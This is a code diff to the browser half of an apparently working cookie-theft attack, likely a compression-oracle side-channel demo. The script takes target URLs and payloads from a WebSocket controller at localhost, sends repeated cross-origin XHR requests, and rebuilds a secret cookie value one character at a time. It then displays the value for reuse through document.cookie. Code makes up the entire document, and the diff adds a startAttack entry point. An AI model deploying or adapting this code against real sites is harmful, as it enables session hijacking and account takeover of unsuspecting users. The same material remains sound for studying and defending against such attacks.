@@ -1,12 +1,13 @@
 document.documentElement.setAttribute('data-theme', 'code')
 
-const STREAM_URL = 'ws://localhost:9999/xhr-interface'
+const STREAM_URL = 'ws://localhost:9000/xhr-interface'
 let guessed = false
 let currentFinalSecret = ''
 let url = ''
 let secretPrefix = ''
 
-window.addEventListener('load', () => {
+const startAttack = () => {
+  document.getElementById('guessSpan').style = 'display: block; color:#fff;font-weight:400; '
   guessed = false
   const spinner = document.getElementById('spinner')
   const final = document.getElementById('final')
@@ -15,18 +16,17 @@ window.addEventListener('load', () => {
   let number = 0
   const timer = setInterval(() => {
     number = (number + 1) % 9
-
+    if (guessed) {
+      spinner.innerText = ''
+      window.clearInterval(timer)
+      return
+    }
     if (url.length > 0) spanUrl.innerText = url
     spinner.innerText = number.toString()
     spanSecretPrefix.innerText = secretPrefix
-    if (guessed) {
-      window.clearInterval(timer)
-      final.innerText = 'Try document.cookie="' + secretPrefix + '' + currentFinalSecret + '"'
-      spinner.innerText = ''
-    }
+
   }, 50)
-})
-const start = () => {
+
   const ws = new window.WebSocket(STREAM_URL)
   ws.onopen = function () {
     console.log('connected to ws')
@@ -41,9 +41,16 @@ const start = () => {
   ws.onmessage = function (e) {
     const data = JSON.parse(e.data)
     url = data.url.toString()
+    if (data.secret === true) {
+      document.getElementById('result').innerHTML = data.finalSecret.toString()
+      spinner.innerText = ''
+      ws.close()
+      guessed = true
+      final.innerText = 'Try document.cookie="' + secretPrefix + '' + data.finalSecret.toString() + '"'
+      return
+    }
     secretPrefix = data.secretPrefix.toString()
     currentFinalSecret = data.finalSecret.toString()
-    if (currentFinalSecret.length >= data.secretLength) guessed = true
     document.getElementById('result').innerHTML = currentFinalSecret
     xhr(url, data.payload)
   }
@@ -56,5 +63,3 @@ function xhr (url, body) {
   xhr.setRequestHeader('Content-Type', 'text/plain')
   xhr.send(body.toString())
 }
-
-start()
